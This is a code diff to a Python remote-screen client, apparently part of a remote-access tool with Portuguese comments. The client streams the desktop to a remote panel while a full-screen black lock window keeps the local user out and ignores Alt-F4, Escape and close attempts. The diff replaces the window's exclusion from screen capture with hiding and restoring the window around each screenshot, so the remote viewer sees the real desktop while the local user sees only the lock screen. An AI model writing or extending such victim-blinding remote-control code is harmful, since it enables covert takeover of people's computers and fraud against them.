@@ -35,6 +35,8 @@ ws_app = None
 running = True
 screen_locked = False
 lock_thread = None
+lock_window = None
+capture_lock = threading.Lock()
 
 
 def set_console_title(title):
@@ -137,7 +139,7 @@ def get_system_info():
 # ============================================
 
 def show_lock_screen(message):
-    global screen_locked, lock_thread
+    global screen_locked, lock_thread, lock_window
 
     if screen_locked:
         return
@@ -145,11 +147,12 @@ def show_lock_screen(message):
     screen_locked = True
 
     def run_lock_window():
-        global screen_locked
+        global screen_locked, lock_window
         try:
             import tkinter as tk
 
             root = tk.Tk()
+            lock_window = root
             root.title("")
 
             screen_width = root.winfo_screenwidth()
@@ -163,15 +166,6 @@ def show_lock_screen(message):
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.bind('<Alt-F4>', lambda e: 'break')
             root.bind('<Escape>', lambda e: 'break')
-
-            # Tornar janela INVISÍVEL para capturas de tela (Windows 10 2004+)
-            root.update()
-            try:
-                hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
-                WDA_EXCLUDEFROMCAPTURE = 0x00000011
-                ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
-            except:
-                pass
 
             frame = tk.Frame(root, bg='#000000')
             frame.place(relx=0.5, rely=0.5, anchor='center')
@@ -189,11 +183,11 @@ def show_lock_screen(message):
             sub_label.pack(pady=15)
 
             def check_unlock():
+                global lock_window
                 if not screen_locked:
+                    lock_window = None
                     root.destroy()
                 else:
-                    root.lift()
-                    root.attributes('-topmost', True)
                     root.after(100, check_unlock)
 
             check_unlock()
@@ -201,6 +195,7 @@ def show_lock_screen(message):
 
         except:
             screen_locked = False
+            lock_window = None
 
     lock_thread = threading.Thread(target=run_lock_window, daemon=True)
     lock_thread.start()
@@ -215,6 +210,25 @@ def hide_lock_screen():
 # CAPTURA DE TELA
 # ============================================
 
+def hide_lock_for_capture():
+    global lock_window
+    if lock_window:
+        try:
+            lock_window.withdraw()
+            time.sleep(0.05)
+        except:
+            pass
+
+def show_lock_after_capture():
+    global lock_window
+    if lock_window and screen_locked:
+        try:
+            lock_window.deiconify()
+            lock_window.lift()
+            lock_window.attributes('-topmost', True)
+        except:
+            pass
+
 def capture_screen():
     global panel_connected, running, current_quality, current_scale
 
@@ -227,7 +241,15 @@ def capture_screen():
                 continue
 
             try:
-                screenshot = sct.grab(monitor)
+                with capture_lock:
+                    if screen_locked and lock_window:
+                        hide_lock_for_capture()
+
+                    screenshot = sct.grab(monitor)
+
+                    if screen_locked and lock_window:
+                        show_lock_after_capture()
+
                 img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
 
                 new_width = int(img.width * current_scale)
@@ -249,6 +271,7 @@ def capture_screen():
 
                 time.sleep(FRAME_INTERVAL)
             except:
+                show_lock_after_capture()
                 time.sleep(1)
 
 
